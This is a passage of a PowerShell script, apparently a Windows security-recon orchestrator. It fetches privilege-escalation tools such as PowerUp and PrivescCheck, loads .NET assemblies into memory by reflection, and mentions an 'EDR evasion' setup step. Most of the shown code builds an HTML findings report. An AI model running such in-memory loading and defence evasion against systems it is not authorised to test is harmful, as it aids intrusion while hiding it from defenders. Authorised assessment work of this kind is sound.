        @{ Key = "stored_cred"; Patterns = @('stored.*credential', 'credential.*manager', 'vault') },
        @{ Key = "weak_svc_perm"; Patterns = @('weak.*permission.*service', 'service.*dacl', 'service.*binary.*modifiable') }
    )

    $findingKeyMap = @{}
    for ($idx = 0; $idx -lt $AllFindings.Count; $idx++) {
        $text = "$($AllFindings[$idx].Title) $($AllFindings[$idx].Category)".ToLower()
        foreach ($dk in $dupeKeys) {
            foreach ($p in $dk.Patterns) {
                if ($text -match $p) {
                    if (-not $findingKeyMap[$idx]) { $findingKeyMap[$idx] = [System.Collections.ArrayList]::new() }
                    $findingKeyMap[$idx].Add($dk.Key) | Out-Null
                    break
                }
            }
        }
    }

    $keyToIndices = @{}
    foreach ($entry in $findingKeyMap.GetEnumerator()) {
        foreach ($key in $entry.Value) {
            if (-not $keyToIndices[$key]) { $keyToIndices[$key] = [System.Collections.ArrayList]::new() }
            $keyToIndices[$key].Add($entry.Key) | Out-Null
        }
    }

    $dupeMap = @{}
    foreach ($entry in $keyToIndices.GetEnumerator()) {
        $indices = $entry.Value
        $tools = @($indices | ForEach-Object { $AllFindings[$_].Tool } | Select-Object -Unique)
        if ($tools.Count -gt 1) {
            foreach ($fidx in $indices) {
                $otherTools = @($tools | Where-Object { $_ -ne $AllFindings[$fidx].Tool })
                if ($otherTools.Count -gt 0) {
                    if (-not $dupeMap[$fidx]) { $dupeMap[$fidx] = [System.Collections.ArrayList]::new() }
                    foreach ($ot in $otherTools) {
                        if ($dupeMap[$fidx] -notcontains $ot) {
                            $dupeMap[$fidx].Add($ot) | Out-Null
                        }
                    }
                }
            }
        }
    }

    return $dupeMap
}

# --- HTML Report Builder ---

function Build-HtmlReport {
    param(
        [array]$Findings,
        [array]$ToolMeta,
        [hashtable]$RawOutputs,
        [hashtable]$Stats,
        [hashtable]$DupeMap
    )

    $sb = [System.Text.StringBuilder]::new(262144)

    $scanDate = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $hostName = ConvertTo-HtmlSafe $env:COMPUTERNAME
    $userName = ConvertTo-HtmlSafe $env:USERNAME
    $osInfo = try { ConvertTo-HtmlSafe (Get-CimInstance Win32_OperatingSystem -ErrorAction SilentlyContinue).Caption } catch { "Unknown" }
    $elapsed = if ($Script:StartTime) {
        $ts = (Get-Date) - $Script:StartTime
        "{0:D2}:{1:D2}" -f [int]$ts.TotalMinutes, $ts.Seconds
    } else { "N/A" }
    $totalFindings = $Findings.Count

    # Compute donut chart degrees
    $total = [math]::Max($Stats.CRITICAL + $Stats.HIGH + $Stats.MEDIUM + $Stats.LOW + $Stats.INFO, 1)
    $d1 = [math]::Round(($Stats.CRITICAL / $total) * 360, 1)
    $d2 = $d1 + [math]::Round(($Stats.HIGH / $total) * 360, 1)
    $d3 = $d2 + [math]::Round(($Stats.MEDIUM / $total) * 360, 1)
    $d4 = $d3 + [math]::Round(($Stats.LOW / $total) * 360, 1)

    # HTML Head + CSS
    $sb.AppendLine(@"
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Security Recon Report - $hostName - $(Get-Date -Format 'yyyy-MM-dd')</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#f1f5f9;color:#1e293b;line-height:1.6}
.header{background:linear-gradient(135deg,#1e293b,#334155);color:#fff;padding:30px 40px}
.header h1{font-size:24px;margin-bottom:8px}
.header .meta{font-size:13px;color:#94a3b8}
.header .meta span{margin-right:20px}
.container{max-width:1200px;margin:0 auto;padding:20px}
.stats-row{display:flex;gap:16px;margin-bottom:24px;flex-wrap:wrap}
.stat-card{flex:1;min-width:100px;background:#fff;border-radius:8px;padding:16px;text-align:center;box-shadow:0 1px 3px rgba(0,0,0,.1)}
.stat-card .count{font-size:28px;font-weight:700}
.stat-card .label{font-size:12px;text-transform:uppercase;color:#64748b;margin-top:4px}
.stat-card.critical .count{color:#dc2626}
.stat-card.high .count{color:#ea580c}
.stat-card.medium .count{color:#ca8a04}
.stat-card.low .count{color:#2563eb}
.stat-card.info .count{color:#6b7280}
.stat-card.total .count{color:#1e293b}
.donut-row{display:flex;align-items:center;justify-content:center;margin-bottom:24px;gap:30px;flex-wrap:wrap}
.donut{width:160px;height:160px;border-radius:50%;position:relative}
.donut-hole{position:absolute;top:25%;left:25%;width:50%;height:50%;border-radius:50%;background:#f1f5f9;display:flex;align-items:center;justify-content:center;flex-direction:column}
.donut-hole .num{font-size:24px;font-weight:700}
.donut-hole .txt{font-size:11px;color:#64748b}
.legend{display:flex;flex-direction:column;gap:6px}
.legend-item{display:flex;align-items:center;gap:8px;font-size:13px}
.legend-dot{width:12px;height:12px;border-radius:3px;flex-shrink:0}
.filter-bar{background:#fff;border-radius:8px;padding:16px;margin-bottom:24px;display:flex;gap:8px;align-items:center;flex-wrap:wrap;box-shadow:0 1px 3px rgba(0,0,0,.1)}
.filter-btn{padding:6px 14px;border-radius:20px;border:2px solid;cursor:pointer;font-size:12px;font-weight:600;transition:all .2s;background:#fff}
.filter-btn.active{color:#fff!important}
.filter-btn.critical{border-color:#dc2626;color:#dc2626}.filter-btn.critical.active{background:#dc2626}
.filter-btn.high{border-color:#ea580c;color:#ea580c}.filter-btn.high.active{background:#ea580c}
.filter-btn.medium{border-color:#ca8a04;color:#ca8a04}.filter-btn.medium.active{background:#ca8a04}
.filter-btn.low{border-color:#2563eb;color:#2563eb}.filter-btn.low.active{background:#2563eb}
.filter-btn.info{border-color:#6b7280;color:#6b7280}.filter-btn.info.active{background:#6b7280}
.search-input{flex:1;min-width:200px;padding:8px 14px;border:1px solid #e2e8f0;border-radius:8px;font-size:13px;outline:none}
.search-input:focus{border-color:#3b82f6;box-shadow:0 0 0 3px rgba(59,130,246,.1)}
.tool-select{padding:7px 12px;border:1px solid #e2e8f0;border-radius:8px;font-size:13px;outline:none;background:#fff}
.filter-info{font-size:12px;color:#64748b;margin-left:auto}
.finding-card{background:#fff;border-radius:8px;margin-bottom:8px;border-left:4px solid #6b7280;box-shadow:0 1px 2px rgba(0,0,0,.06);overflow:hidden}
.finding-card.critical{border-left-color:#dc2626}
.finding-card.high{border-left-color:#ea580c}
.finding-card.medium{border-left-color:#ca8a04}
.finding-card.low{border-left-color:#2563eb}
.finding-card.info{border-left-color:#6b7280}
.finding-header{padding:12px 16px;cursor:pointer;display:flex;align-items:center;gap:10px;user-select:none}
.finding-header:hover{background:#f8fafc}
.sev-badge{display:inline-block;padding:2px 8px;border-radius:4px;font-size:11px;font-weight:700;text-transform:uppercase;color:#fff;min-width:70px;text-align:center}
.sev-badge.critical{background:#dc2626}.sev-badge.high{background:#ea580c}.sev-badge.medium{background:#ca8a04}
.sev-badge.low{background:#2563eb}.sev-badge.info{background:#6b7280}
.f-tool{font-size:11px;color:#64748b;background:#f1f5f9;padding:2px 8px;border-radius:4px}
.f-cat{font-size:11px;color:#64748b}
.f-title{flex:1;font-size:13px;font-weight:500;overflow:hidden;text-overflow:ellipsis}
.dupe-badge{font-size:10px;background:#dbeafe;color:#1d4ed8;padding:2px 6px;border-radius:10px;white-space:nowrap}
.expand-icon{font-size:16px;color:#94a3b8;font-weight:700;width:20px;text-align:center}
.finding-detail{padding:0 16px 16px 16px}
.finding-detail pre{background:#1e293b;color:#e2e8f0;padding:16px;border-radius:6px;font-size:12px;overflow-x:auto;white-space:pre-wrap;word-wrap:break-word;max-height:400px;overflow-y:auto;font-family:'Cascadia Code','Fira Code',Consolas,monospace;line-height:1.4}
.section-title{font-size:18px;font-weight:600;margin:30px 0 16px;color:#1e293b;display:flex;align-items:center;gap:8px}
.section-title .cnt{font-size:13px;background:#e2e8f0;color:#475569;padding:2px 10px;border-radius:12px}
.tool-status-bar{display:flex;gap:8px;margin-bottom:24px;flex-wrap:wrap}
.tool-chip{padding:6px 12px;border-radius:6px;font-size:12px;font-weight:500}
.tool-chip.ok{background:#dcfce7;color:#166534}
.tool-chip.fail{background:#fee2e2;color:#991b1b}
.tool-chip.timeout{background:#fee2e2;color:#991b1b}
.tool-chip.skip{background:#e0e7ff;color:#3730a3}
.tool-chip.pending{background:#f1f5f9;color:#64748b}
.raw-section{margin-bottom:12px}
.raw-toggle{background:#fff;width:100%;padding:12px 16px;border:1px solid #e2e8f0;border-radius:8px;cursor:pointer;text-align:left;font-size:13px;font-weight:500;display:flex;justify-content:space-between;align-items:center}
.raw-toggle:hover{background:#f8fafc}
.raw-content{background:#1e293b;color:#e2e8f0;padding:16px;border-radius:0 0 8px 8px;font-size:11px;font-family:'Cascadia Code','Fira Code',Consolas,monospace;white-space:pre-wrap;word-wrap:break-word;max-height:500px;overflow-y:auto;line-height:1.4}
.exec-summary{background:#fff;border-radius:8px;padding:20px;margin-bottom:24px;box-shadow:0 1px 3px rgba(0,0,0,.1)}
.exec-summary h3{margin-bottom:12px;font-size:16px}
.exec-item{padding:8px 0;border-bottom:1px solid #f1f5f9;display:flex;align-items:center;gap:10px;font-size:13px}
.exec-item:last-child{border-bottom:none}
.footer{text-align:center;padding:30px;color:#94a3b8;font-size:12px}
@media print{.filter-bar{display:none}.finding-detail{display:block!important}.finding-card{break-inside:avoid}}
@media(max-width:768px){.header{padding:20px}.stats-row{gap:8px}.stat-card{min-width:80px;padding:10px}.stat-card .count{font-size:20px}}
</style>
</head>
<body>
"@) | Out-Null

    # Header
    $sb.AppendLine(@"
<div class="header">
<h1>Windows Security Recon Report</h1>
<div class="meta">
<span>Host: <strong>$hostName</strong></span>
<span>User: <strong>$userName</strong></span>
<span>OS: $osInfo</span>
<span>Date: $scanDate</span>
<span>Duration: $elapsed</span>
</div>
</div>
<div class="container">
"@) | Out-Null

    # Tool status bar
    $sb.AppendLine('<div class="tool-status-bar">') | Out-Null
    foreach ($tm in $ToolMeta) {
        $statusClass = switch ($tm.Status) {
            "OK"      { "ok" }
            "FAIL"    { "fail" }
            "TIMEOUT" { "timeout" }
            "SKIP"    { "skip" }
            default   { "pending" }
        }
        $statusText = "$($tm.Name): $($tm.Status)"
        if ($tm.Duration -gt 0) { $statusText += " ($([math]::Round($tm.Duration, 1))s)" }
        if ($tm.Error) { $statusText += " - $(ConvertTo-HtmlSafe $tm.Error)" }
        $sb.AppendLine("<span class=`"tool-chip $statusClass`">$(ConvertTo-HtmlSafe $statusText)</span>") | Out-Null
    }
    $sb.AppendLine('</div>') | Out-Null

    # Stats row
    $sb.AppendLine(@"
<div class="stats-row">
<div class="stat-card critical"><div class="count">$($Stats.CRITICAL)</div><div class="label">Critical</div></div>
<div class="stat-card high"><div class="count">$($Stats.HIGH)</div><div class="label">High</div></div>
<div class="stat-card medium"><div class="count">$($Stats.MEDIUM)</div><div class="label">Medium</div></div>
<div class="stat-card low"><div class="count">$($Stats.LOW)</div><div class="label">Low</div></div>
<div class="stat-card info"><div class="count">$($Stats.INFO)</div><div class="label">Info</div></div>
<div class="stat-card total"><div class="count">$totalFindings</div><div class="label">Total</div></div>
</div>
"@) | Out-Null

    # Donut chart
    $conicGrad = "conic-gradient(#dc2626 0deg ${d1}deg,#ea580c ${d1}deg ${d2}deg,#ca8a04 ${d2}deg ${d3}deg,#2563eb ${d3}deg ${d4}deg,#6b7280 ${d4}deg 360deg)"
    $sb.AppendLine(@"
<div class="donut-row">
<div class="donut" style="background:$conicGrad">
<div class="donut-hole"><span class="num">$totalFindings</span><span class="txt">findings</span></div>
</div>
<div class="legend">
<div class="legend-item"><span class="legend-dot" style="background:#dc2626"></span>Critical ($($Stats.CRITICAL))</div>
<div class="legend-item"><span class="legend-dot" style="background:#ea580c"></span>High ($($Stats.HIGH))</div>
<div class="legend-item"><span class="legend-dot" style="background:#ca8a04"></span>Medium ($($Stats.MEDIUM))</div>
<div class="legend-item"><span class="legend-dot" style="background:#2563eb"></span>Low ($($Stats.LOW))</div>
<div class="legend-item"><span class="legend-dot" style="background:#6b7280"></span>Info ($($Stats.INFO))</div>
</div>
</div>
"@) | Out-Null

    # Filter bar
    $toolOptions = ($ToolMeta | ForEach-Object { "<option value=`"$(ConvertTo-HtmlSafe $_.Name)`">$(ConvertTo-HtmlSafe $_.Name)</option>" }) -join ""
    $sb.AppendLine(@"
<div class="filter-bar">
<button class="filter-btn critical active" data-filter="CRITICAL" onclick="toggleSev(this)">Critical ($($Stats.CRITICAL))</button>
<button class="filter-btn high active" data-filter="HIGH" onclick="toggleSev(this)">High ($($Stats.HIGH))</button>
<button class="filter-btn medium active" data-filter="MEDIUM" onclick="toggleSev(this)">Medium ($($Stats.MEDIUM))</button>
<button class="filter-btn low active" data-filter="LOW" onclick="toggleSev(this)">Low ($($Stats.LOW))</button>
<button class="filter-btn info active" data-filter="INFO" onclick="toggleSev(this)">Info ($($Stats.INFO))</button>
<select class="tool-select" onchange="applyFilters()"><option value="all">All Tools</option>$toolOptions</select>
<input class="search-input" type="text" placeholder="Search findings..." oninput="applyFilters()">
<span class="filter-info" id="visibleCount">Showing $totalFindings of $totalFindings</span>
</div>
"@) | Out-Null

    # Executive Summary (top 10 non-INFO findings by severity)
    $sevOrder = @{ "CRITICAL" = 0; "HIGH" = 1; "MEDIUM" = 2; "LOW" = 3; "INFO" = 4 }
    $topFindings = @($Findings | Where-Object { $_.Severity -ne "INFO" } |
        Sort-Object { $sevOrder[$_.Severity] } | Select-Object -First 10)

    if ($topFindings.Count -gt 0) {
        $sb.AppendLine('<div class="exec-summary"><h3>Executive Summary - Top Findings</h3>') | Out-Null
        foreach ($tf in $topFindings) {
            $sevLower = $tf.Severity.ToLower()
            $safeTitle = ConvertTo-HtmlSafe $tf.Title
            $safeTool = ConvertTo-HtmlSafe $tf.Tool
            $sb.AppendLine(@"
<div class="exec-item">
<span class="sev-badge $sevLower">$($tf.Severity)</span>
<span class="f-tool">$safeTool</span>
<span>$safeTitle</span>
</div>
"@) | Out-Null
        }
        $sb.AppendLine('</div>') | Out-Null
    }

    # Findings section
    $sb.AppendLine("<div class=`"section-title`">All Findings <span class=`"cnt`">$totalFindings</span></div>") | Out-Null

    for ($fi = 0; $fi -lt $Findings.Count; $fi++) {
        $f = $Findings[$fi]
        $sevLower = $f.Severity.ToLower()
        $safeTitle = ConvertTo-HtmlSafe $f.Title
        $safeDetails = ConvertTo-HtmlSafe $f.Details
        $safeTool = ConvertTo-HtmlSafe $f.Tool
        $safeCat = ConvertTo-HtmlSafe $f.Category

        $dupeBadge = ""
        if ($DupeMap -and $DupeMap.ContainsKey($fi)) {
            $otherTools = ($DupeMap[$fi] | ForEach-Object { ConvertTo-HtmlSafe $_ }) -join ", "
            $dupeBadge = "<span class=`"dupe-badge`" title=`"Also found by: $otherTools`">+$($DupeMap[$fi].Count) tools</span>"
        }

        $sb.AppendLine(@"
<div class="finding-card $sevLower" data-severity="$($f.Severity)" data-tool="$safeTool" data-category="$safeCat">
<div class="finding-header" onclick="toggleDetail(this)">
<span class="sev-badge $sevLower">$($f.Severity)</span>
<span class="f-tool">$safeTool</span>
<span class="f-cat">$safeCat</span>
<span class="f-title">$safeTitle</span>
$dupeBadge
<span class="expand-icon">+</span>
</div>
<div class="finding-detail" style="display:none"><pre>$safeDetails</pre></div>
</div>
"@) | Out-Null
    }

    # Raw Tool Output sections
    $sb.AppendLine('<div class="section-title">Raw Tool Output</div>') | Out-Null

    foreach ($tm in $ToolMeta) {
        $toolName = $tm.Name
        $rawContent = if ($RawOutputs -and $RawOutputs.ContainsKey($toolName)) { $RawOutputs[$toolName] } else { $null }
        $safeToolName = ConvertTo-HtmlSafe $toolName
        $rawId = "raw_$($toolName -replace '\W', '')"

        if ($rawContent) {
            $safeRaw = ConvertTo-HtmlSafe $rawContent
            $sizeStr = if ($rawContent.Length -ge 1MB) { "$([math]::Round($rawContent.Length/1MB, 1)) MB" } else { "$([math]::Round($rawContent.Length/1KB, 0)) KB" }
            $sb.AppendLine(@"
<div class="raw-section">
<button class="raw-toggle" onclick="toggleRaw('$rawId')">
<span>$safeToolName ($sizeStr)</span><span id="${rawId}_icon">+</span>
</button>
<div class="raw-content" id="$rawId" style="display:none">$safeRaw</div>
</div>
"@) | Out-Null
        } else {
            $errMsg = if ($tm.Error) { ConvertTo-HtmlSafe $tm.Error } else { "No output" }
            $sb.AppendLine(@"
<div class="raw-section">
<button class="raw-toggle" style="opacity:0.5;cursor:default">
<span>$safeToolName - $($tm.Status): $errMsg</span><span></span>
</button>
</div>
"@) | Out-Null
        }
    }

    # Footer + JavaScript
    $sb.AppendLine(@"
<div class="footer">
Generated by Windows Automated Security Reconnaissance | $scanDate | $hostName
</div>
</div>

<script>
function toggleDetail(header){
    var d=header.nextElementSibling;
    var icon=header.querySelector('.expand-icon');
    if(d.style.display==='none'){d.style.display='';icon.textContent='-';}
    else{d.style.display='none';icon.textContent='+';}
}
function toggleRaw(id){
    var el=document.getElementById(id);
    var icon=document.getElementById(id+'_icon');
    if(el.style.display==='none'){el.style.display='';if(icon)icon.textContent='-';}
    else{el.style.display='none';if(icon)icon.textContent='+';}
}
function toggleSev(btn){
    btn.classList.toggle('active');
    applyFilters();
}
function applyFilters(){
    var activeSevs=[];
    document.querySelectorAll('.filter-btn').forEach(function(b){
        if(b.classList.contains('active'))activeSevs.push(b.getAttribute('data-filter'));
    });
    var toolFilter=document.querySelector('.tool-select').value;
    var searchVal=document.querySelector('.search-input').value.toLowerCase();
    var cards=document.querySelectorAll('.finding-card');
    var visible=0;
    cards.forEach(function(card){
        var sevMatch=activeSevs.indexOf(card.getAttribute('data-severity'))!==-1;
        var toolMatch=(toolFilter==='all'||card.getAttribute('data-tool')===toolFilter);
        var searchMatch=(!searchVal||card.textContent.toLowerCase().indexOf(searchVal)!==-1);
        if(sevMatch&&toolMatch&&searchMatch){card.style.display='';visible++;}
        else{card.style.display='none';}
    });
    document.getElementById('visibleCount').textContent='Showing '+visible+' of '+$totalFindings;
}
</script>
</body>
</html>
"@) | Out-Null

    return $sb.ToString()
}

# --- Report Orchestrator ---

function New-ConsolidatedHtmlReport {
    $reportPath = Join-Path $Script:OutputDir $HtmlReportFileName

    $allFindings = [System.Collections.ArrayList]::new()
    $toolMeta = [System.Collections.ArrayList]::new()
    $rawOutputs = @{}

    foreach ($tool in $Script:EnabledTools) {
        $toolName = $tool.Name
        $tr = $Script:ToolResults[$toolName]
        $outputFile = Join-Path $Script:OutputDir "$toolName-output.txt"

        $meta = @{
            Name         = $toolName
            Status       = $tr.Status
            Duration     = $tr.Duration
            Size         = $tr.OutputSize
            Error        = $tr.Error
            FindingCount = 0
        }

        $shouldParse = ($tr.Status -eq "OK") -or ($tr.Status -eq "TIMEOUT")

        if ($shouldParse -and (Test-Path $outputFile -ErrorAction SilentlyContinue)) {
            $rawOutput = Get-Content -Path $outputFile -Raw -ErrorAction SilentlyContinue
            $rawOutputs[$toolName] = $rawOutput

            if ($rawOutput -and $rawOutput.Trim().Length -gt 0) {
                try {
                    $findings = ConvertFrom-ToolOutput -ToolName $toolName -RawOutput $rawOutput

                    if ($tr.Status -eq "TIMEOUT") {
                        foreach ($f in $findings) {
                            $f.Title = "[PARTIAL] $($f.Title)"
                        }
                    }

                    $meta.FindingCount = $findings.Count

                    # Line coverage safety net
                    $unparsedLines = Test-FindingLineCoverage -RawOutput $rawOutput -Findings $findings
                    if ($unparsedLines -and $unparsedLines.Count -gt 0) {
                        $unparsedText = $unparsedLines -join "`n"
                        $unparsedSev = Get-SeverityFromKeywords -Text $unparsedText
                        $allFindings.Add(@{
                            Tool     = $toolName
                            Category = "Unclassified"
                            Severity = $unparsedSev
                            Title    = "$toolName - Unclassified output ($($unparsedLines.Count) lines)"
                            Details  = $unparsedText
                            RawLines = $unparsedLines
                        }) | Out-Null
                    }

                    foreach ($f in $findings) {
                        $allFindings.Add($f) | Out-Null
                    }

                    Write-Log "Parsed ${toolName}: $($findings.Count) findings, $($unparsedLines.Count) unclassified lines"
                } catch {
                    Write-Log "Failed to parse $toolName output: $($_.Exception.Message)" -Level "WARN"
                    $allFindings.Add(@{
                        Tool = $toolName; Category = "Parse Error"; Severity = "INFO"
                        Title = "$toolName - Parse error (raw output preserved below)"
                        Details = "Parser error: $($_.Exception.Message)"
                        RawLines = @()
                    }) | Out-Null
                }
            }
        } else {
            $rawOutputs[$toolName] = $null
        }

        $toolMeta.Add($meta) | Out-Null
    }

    # Cross-tool deduplication hints
    $dupeMap = Find-DuplicateFindings -AllFindings $allFindings.ToArray()

    # Severity statistics
    $stats = @{
        CRITICAL = @($allFindings | Where-Object { $_.Severity -eq "CRITICAL" }).Count
        HIGH     = @($allFindings | Where-Object { $_.Severity -eq "HIGH" }).Count
        MEDIUM   = @($allFindings | Where-Object { $_.Severity -eq "MEDIUM" }).Count
        LOW      = @($allFindings | Where-Object { $_.Severity -eq "LOW" }).Count
        INFO     = @($allFindings | Where-Object { $_.Severity -eq "INFO" }).Count
    }

    # Sort findings by severity (CRITICAL first)
    $sevOrder = @{ "CRITICAL" = 0; "HIGH" = 1; "MEDIUM" = 2; "LOW" = 3; "INFO" = 4 }
    $sortedFindings = @($allFindings | Sort-Object { $sevOrder[$_.Severity] })

    # Build HTML
    $html = Build-HtmlReport -Findings $sortedFindings -ToolMeta $toolMeta.ToArray() `
        -RawOutputs $rawOutputs -Stats $stats -DupeMap $dupeMap

    # Write file
    [System.IO.File]::WriteAllText($reportPath, $html, [System.Text.Encoding]::UTF8)

    Write-Log "HTML report written: $reportPath ($($html.Length) bytes, $($allFindings.Count) findings)"
    return $reportPath
}

# ============================================================================
# SECTION J: SUMMARY
# ============================================================================

function Show-Summary {
    $elapsed = if ($Script:StartTime) { (Get-Date) - $Script:StartTime } else { [TimeSpan]::Zero }
    $elapsedStr = "{0:D2}:{1:D2}" -f [int]$elapsed.TotalMinutes, $elapsed.Seconds
    $separator = "=" * 56

    Write-Host ""
    Write-Host $separator -ForegroundColor DarkCyan
    Write-Host "  EXECUTION SUMMARY" -ForegroundColor Cyan
    Write-Host $separator -ForegroundColor DarkCyan
    Write-Host ""

    $okCount = 0
    $failCount = 0

    foreach ($tool in $Script:EnabledTools) {
        $tr = $Script:ToolResults[$tool.Name]
        $statusIcon = ""
        $color = "White"

        switch ($tr.Status) {
            "OK"      { $statusIcon = "[OK]     "; $color = "Green"; $okCount++ }
            "FAIL"    { $statusIcon = "[FAIL]   "; $color = "Red"; $failCount++ }
            "TIMEOUT" { $statusIcon = "[TIMEOUT]"; $color = "Red"; $failCount++ }
            "SKIP"    { $statusIcon = "[SKIP]   "; $color = "Cyan"; $failCount++ }
            default   { $statusIcon = "[???]    "; $color = "Gray" }
        }

        Write-Host "  $statusIcon " -ForegroundColor $color -NoNewline
        Write-Host "$($tool.Name.PadRight(16))" -NoNewline

        if ($tr.Duration -gt 0) {
            Write-Host " $([math]::Round($tr.Duration, 1))s" -NoNewline -ForegroundColor DarkGray
        }

        if ($tr.OutputSize -gt 0) {
            $sizeStr = if ($tr.OutputSize -ge 1MB) { "$([math]::Round($tr.OutputSize/1MB, 1)) MB" } else { "$([math]::Round($tr.OutputSize/1KB, 0)) KB" }
            Write-Host "  -> $sizeStr" -NoNewline -ForegroundColor DarkGray
        }

        if ($tr.Error) {
            Write-Host "  ($($tr.Error))" -NoNewline -ForegroundColor DarkYellow
        }

        Write-Host ""
    }

    Write-Host ""
    Write-Host ("  Results: {0} OK / {1} Failed / {2} Total" -f $okCount, $failCount, $Script:EnabledTools.Count) -ForegroundColor White
    Write-Host ("  Total Time: {0}" -f $elapsedStr) -ForegroundColor DarkGray
    Write-Host ("  Output Dir: {0}" -f $Script:OutputDir) -ForegroundColor DarkGray
    Write-Host ""

    # Write summary file
    $summaryFile = Join-Path $Script:OutputDir "summary.txt"
    $summaryContent = @"
Windows Security Recon - Summary
================================
Host: $($env:COMPUTERNAME)
User: $($env:USERNAME)
Date: $(Get-Date -Format "yyyy-MM-dd HH:mm:ss")
Duration: $elapsedStr

Tool Results:
"@
    foreach ($tool in $Script:EnabledTools) {
        $tr = $Script:ToolResults[$tool.Name]
        $sizeStr = if ($tr.OutputSize -ge 1MB) { "$([math]::Round($tr.OutputSize/1MB, 1)) MB" } elseif ($tr.OutputSize -gt 0) { "$([math]::Round($tr.OutputSize/1KB, 0)) KB" } else { "N/A" }
        $summaryContent += "`n  $($tr.Status.PadRight(8)) $($tool.Name.PadRight(16)) Duration: $([math]::Round($tr.Duration, 1))s  Output: $sizeStr"
        if ($tr.Error) { $summaryContent += "  Error: $($tr.Error)" }
    }
    $summaryContent += "`n`nResults: $okCount OK / $failCount Failed / $($Script:EnabledTools.Count) Total"
    $summaryContent += "`nOutput Directory: $($Script:OutputDir)"
    if ($GenerateHtmlReport) {
        $summaryContent += "`nHTML Report: $($Script:OutputDir)\$HtmlReportFileName"
    }
    Set-Content -Path $summaryFile -Value $summaryContent -Encoding UTF8
    Write-Log "Summary written to $summaryFile"
}

# ============================================================================
# SECTION K: MAIN ORCHESTRATION
# ============================================================================

try {
    # Banner
    Show-Banner

    # Cleaner mode: skip recon, just clean everything
    if ($Clean) {
        Invoke-CleanerMode
        $Script:ScriptCompleted = $true
        return
    }

    # Phase 0: Pre-flight checks
    $Script:CurrentPhase = "PRE-FLIGHT"
    Invoke-PreFlightChecks

    # Initialize environment (dirs, TLS, EDR evasion)
    Initialize-Environment

    # Initialize dashboard
    Initialize-Dashboard
    $Script:CurrentPhase = "DOWNLOAD"
    Show-Dashboard

    # Phase 1: Download/Load all tools
    $toolDataMap = @{}
    foreach ($tool in $Script:EnabledTools) {
        $toolName = $tool.Name
        try {
            $Script:ToolResults[$toolName].Status = "RUNNING"
            $Script:ToolResults[$toolName].StartedAt = Get-Date
            Show-Dashboard

            $toolData = Get-Tool -Tool $tool
            $toolDataMap[$toolName] = $toolData

            $Script:ToolResults[$toolName].Status = "PENDING"
            $Script:ToolResults[$toolName].StartedAt = $null
            Write-Log "Tool $toolName loaded successfully"
        } catch {
            $errMsg = $_.Exception.Message
            if ($errMsg.Length -gt 60) { $errMsg = $errMsg.Substring(0, 60) + "..." }
            $Script:ToolResults[$toolName].Status = "FAIL"
            $Script:ToolResults[$toolName].Error = "Download failed: $errMsg"
            $Script:ToolResults[$toolName].Duration = if ($Script:ToolResults[$toolName].StartedAt) {
                ((Get-Date) - $Script:ToolResults[$toolName].StartedAt).TotalSeconds
            } else { 0 }
            Write-Log "Tool $toolName download failed: $($_.Exception.Message)" -Level "ERROR"
            Show-Dashboard
        }
    }

    # Phase 2: Execute tools
    $Script:CurrentPhase = "EXECUTION"
    Show-Dashboard

    foreach ($tool in $Script:EnabledTools) {
        $toolName = $tool.Name

        # Skip if download failed
        if ($Script:ToolResults[$toolName].Status -eq "FAIL") {
            continue
        }

        $toolData = $toolDataMap[$toolName]
        $Script:ToolResults[$toolName].Status = "RUNNING"
        $Script:ToolResults[$toolName].StartedAt = Get-Date
        Show-Dashboard

        try {
            # Execute with timeout
            $job = Start-Job -ScriptBlock {
                param($ScriptRoot, $ToolJson, $ToolDataJson, $OutputDir)

                # Reconstruct tool and data inside the job
                $tool = $ToolJson | ConvertFrom-Json
                $toolData = $ToolDataJson | ConvertFrom-Json

                # We can't easily run complex reflection inside jobs,
                # so we'll use runspaces for exe tools instead
            } -ArgumentList $PSScriptRoot, ($tool | ConvertTo-Json), ($toolData | ConvertTo-Json), $Script:OutputDir

            # For simplicity and reliability, run tools synchronously with timeout via runspace
            $runspace = [powershell]::Create()
            $toolRef = $tool
            $toolDataRef = $toolData
            $outputDir = $Script:OutputDir
            $timeoutSec = $TimeoutSeconds

            $runspace.AddScript({
                param($Tool, $ToolData, $OutputDir)

                $toolName = $Tool.Name
                $toolType = $Tool.Type
                $outputFile = Join-Path $OutputDir "$toolName-output.txt"

                switch ($toolType) {
                    "exe" {
                        $bytes = [Convert]::FromBase64String($ToolData.BytesB64)
                        $assembly = [System.Reflection.Assembly]::Load($bytes)
                        $entryPoint = $assembly.EntryPoint

                        if (-not $entryPoint) {
                            throw "No entry point found in $toolName assembly"
                        }

                        $oldOut = [Console]::Out
                        $stringWriter = New-Object System.IO.StringWriter
                        [Console]::SetOut($stringWriter)

                        try {
                            $params = $Tool.Args
                            if ($entryPoint.GetParameters().Count -gt 0) {
                                $entryPoint.Invoke($null, @(,[string[]]$params))
                            } else {
                                $entryPoint.Invoke($null, $null)
                            }
                        } catch {
                            # Many tools throw on completion
                        } finally {
                            [Console]::SetOut($oldOut)
                        }

                        $output = $stringWriter.ToString()
                        $stringWriter.Dispose()

                        if ($output.Length -gt 0) {
                            [System.IO.File]::WriteAllText($outputFile, $output, [System.Text.Encoding]::UTF8)
                        } else {
                            throw "$toolName produced no output"
                        }
                    }
                    "ps1" {
                        $scriptContent = $ToolData.Script

                        $invokeCmd = switch ($toolName) {
                            "PowerUp"       { $scriptContent + "`nInvoke-AllChecks" }
                            "PrivescCheck"  { $scriptContent + "`nInvoke-PrivescCheck -Extended" }
                            default         { $scriptContent }
                        }

                        $sb = [scriptblock]::Create($invokeCmd)
                        $output = & $sb | Out-String

                        if ($output.Length -gt 0) {
                            [System.IO.File]::WriteAllText($outputFile, $output, [System.Text.Encoding]::UTF8)
                        } else {
                            throw "$toolName produced no output"
                        }
                    }
                    "bat" {
                        $batPath = $ToolData.Path
                        $output = & cmd.exe /c "`"$batPath`"" 2>&1 | Out-String

                        if ($output.Length -gt 0) {
                            [System.IO.File]::WriteAllText($outputFile, $output, [System.Text.Encoding]::UTF8)
                        } else {
                            throw "$toolName produced no output"
                        }
                    }
                }

                return $outputFile
            }).AddArgument($toolRef)

            # Prepare tool data for passing to runspace
            $toolDataForRunspace = @{}
            if ($toolData.Bytes) {
                $toolDataForRunspace["BytesB64"] = [Convert]::ToBase64String($toolData.Bytes)
            }
